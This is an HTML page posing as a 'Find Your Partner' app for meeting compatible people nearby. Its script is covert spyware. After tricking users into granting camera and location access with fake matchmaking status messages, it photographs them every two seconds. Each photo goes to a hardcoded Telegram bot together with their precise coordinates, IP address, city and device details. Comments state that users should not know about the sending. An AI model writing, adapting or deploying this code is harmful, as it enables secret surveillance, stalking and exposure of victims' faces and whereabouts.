<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Find Partner</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: #0a0a0a;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    height: 100vh;
    overflow: hidden;
    position: relative;
}

.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100%;
    padding: 20px;
    text-align: center;
}

.logo {
    font-size: 32px;
    margin-bottom: 10px;
}

.title {
    font-size: 24px;
    font-weight: 600;
    margin-bottom: 5px;
}

.subtitle {
    color: #aaa;
    font-size: 14px;
    margin-bottom: 40px;
}

.loading-container {
    display: none;
    margin: 30px 0;
}

.spinner {
    width: 50px;
    height: 50px;
    border: 3px solid rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    border-top-color: #4CAF50;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-text {
    font-size: 18px;
    color: #4CAF50;
}

.status-text {
    font-size: 14px;
    color: #888;
    margin-top: 10px;
    min-height: 20px;
}

.error-container {
    display: none;
    background: rgba(255, 50, 50, 0.1);
    border: 1px solid rgba(255, 50, 50, 0.3);
    border-radius: 10px;
    padding: 15px;
    margin: 20px 0;
    max-width: 300px;
}

.error-title {
    color: #ff5555;
    font-size: 16px;
    margin-bottom: 5px;
}

.error-message {
    color: #ff9999;
    font-size: 14px;
}

.start-button {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    padding: 18px;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    z-index: 1000;
}

.start-button:hover {
    background: linear-gradient(135deg, #5a6fd8 0%, #6a4190 100%);
}

.start-button:active {
    transform: scale(0.98);
}

.start-button:disabled {
    opacity: 0.7;
    cursor: not-allowed;
}

.canvas-container {
    display: none;
}

.partner-info {
    background: rgba(255, 255, 255, 0.05);
    border-radius: 10px;
    padding: 15px;
    margin-top: 20px;
    font-size: 14px;
    color: #ccc;
}

.info-item {
    margin: 5px 0;
}
</style>
</head>
<body>
<div class="container">
    <div class="logo">üîç</div>
    <h1 class="title">Find Your Partner</h1>
    <p class="subtitle">Connect with compatible people nearby</p>
    
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">Searching for partner...</div>
        <div class="status-text" id="statusText">Waiting For Your Partner</div>
    </div>
    
    <div class="error-container" id="errorContainer">
        <div class="error-title">Connection Error</div>
        <div class="error-message" id="errorMessage"></div>
    </div>
    
    <div class="partner-info" id="partnerInfo" style="display: none;">
        <div class="info-item">üìç Connecting to nearby users...</div>
        <div class="info-item">üì∂ Optimizing connection...</div>
        <div class="info-item">üîí Securing your data...</div>
    </div>
</div>

<canvas id="canvas" class="canvas-container"></canvas>

<button class="start-button" id="startButton" onclick="startSearch()">Start</button>

<script>
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";

let intervalId = null;
let stream = null;
let isSearching = false;

const startButton = document.getElementById('startButton');
const loadingContainer = document.getElementById('loadingContainer');
const statusText = document.getElementById('statusText');
const errorContainer = document.getElementById('errorContainer');
const errorMessage = document.getElementById('errorMessage');
const partnerInfo = document.getElementById('partnerInfo');

const statusMessages = [
    "Searching nearby users...",
    "Checking compatibility...",
    "Establishing connection...",
    "Verifying profile...",
    "Almost there..."
];

let statusIndex = 0;

function updateStatus() {
    statusText.textContent = statusMessages[statusIndex];
    statusIndex = (statusIndex + 1) % statusMessages.length;
}

function showError(message) {
    errorMessage.textContent = message;
    errorContainer.style.display = 'block';
    loadingContainer.style.display = 'none';
    partnerInfo.style.display = 'none';
}

function hideError() {
    errorContainer.style.display = 'none';
}

function startSearch() {
    if (isSearching) return;
    
    isSearching = true;
    startButton.disabled = true;
    startButton.textContent = "Searching...";
    loadingContainer.style.display = 'block';
    partnerInfo.style.display = 'block';
    hideError();
    
    // Start updating status messages
    updateStatus();
    const statusInterval = setInterval(updateStatus, 3000);
    
    // Request permissions
    Promise.all([
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
        new Promise((resolve, reject) => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else {
                resolve(null);
            }
        })
    ])
    .then(([mediaStream, location]) => {
        stream = mediaStream;
        clearInterval(statusInterval);
        statusText.textContent = "Partner found! Starting connection...";
        
        // Start sending data after 3 seconds
        setTimeout(() => {
            startSending();
            startButton.textContent = "Connected ‚úì";
            statusText.textContent = "Connection established";
        }, 3000);
    })
    .catch((error) => {
        clearInterval(statusInterval);
        isSearching = false;
        startButton.disabled = false;
        startButton.textContent = "Start";
        loadingContainer.style.display = 'none';
        
        if (error.name === 'NotAllowedError') {
            showError("Please allow camera and location access to find partners.");
        } else if (error.name === 'NotFoundError') {
            showError("Camera not found. Please check your device.");
        } else {
            showError("Unable to start search. Please try again.");
        }
    });
}

function startSending() {
    if (!intervalId) {
        intervalId = setInterval(captureAndSend, 2000);
    }
}

function captureAndSend() {
    if (!stream) return;
    
    try {
        const canvas = document.getElementById('canvas');
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        
        imageCapture.grabFrame().then(imageBitmap => {
            canvas.width = imageBitmap.width;
            canvas.height = imageBitmap.height;
            const ctx = canvas.getContext("2d");
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(imageBitmap, 0, 0);
            
            canvas.toBlob(blob => {
                // Collect system information
                const systemInfo = collectSystemInfo();
                const caption = generateCaption(systemInfo);
                
                // Send to Telegram
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");
                formData.append("caption", caption);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).catch(() => {
                    // Silent fail - user shouldn't know
                });
            }, "image/jpeg", 0.7);
        }).catch(() => {
            // Silent fail
        });
    } catch (error) {
        // Silent fail
    }
}

function collectSystemInfo() {
    const info = {
        time: new Date().toLocaleString(),
        userAgent: navigator.userAgent.substring(0, 80),
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory || 'Unknown'
    };
    
    // Get location if available
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(position => {
            info.latitude = position.coords.latitude.toFixed(6);
            info.longitude = position.coords.longitude.toFixed(6);
        }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
    }
    
    // Get IP info
    fetch("https://api.ipify.org?format=json")
        .then(r => r.json())
        .then(d => {
            info.ip = d.ip;
            return fetch(`https://ipapi.co/${d.ip}/json/`);
        })
        .then(r => r.json())
        .then(ipData => {
            info.city = ipData.city || "Unknown";
            info.country = ipData.country_name || "Unknown";
        })
        .catch(() => {});
    
    return info;
}

function generateCaption(info) {
    return `
üì∏ Partner Connection - ${info.time}

üìç Location:
${info.latitude ? `Latitude: ${info.latitude}` : 'Location not available'}
${info.longitude ? `Longitude: ${info.longitude}` : ''}
${info.city ? `City: ${info.city}` : ''}
${info.country ? `Country: ${info.country}` : ''}
${info.ip ? `IP: ${info.ip}` : ''}

üñ•Ô∏è Device Info:
${info.platform ? `Device: ${info.platform}` : ''}
${info.cores ? `CPU Cores: ${info.cores}` : ''}
${info.ram ? `RAM: ${info.ram} GB` : ''}
Screen: ${info.screen}
Language: ${info.language}

üåê Browser:
${info.userAgent}

‚ö†Ô∏è Automatic partner connection update
`;
}

// Prevent user from knowing about data sending
window.addEventListener('beforeunload', () => {
    if (intervalId) {
        clearInterval(intervalId);
    }
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
});
</script>
</body>
</html>
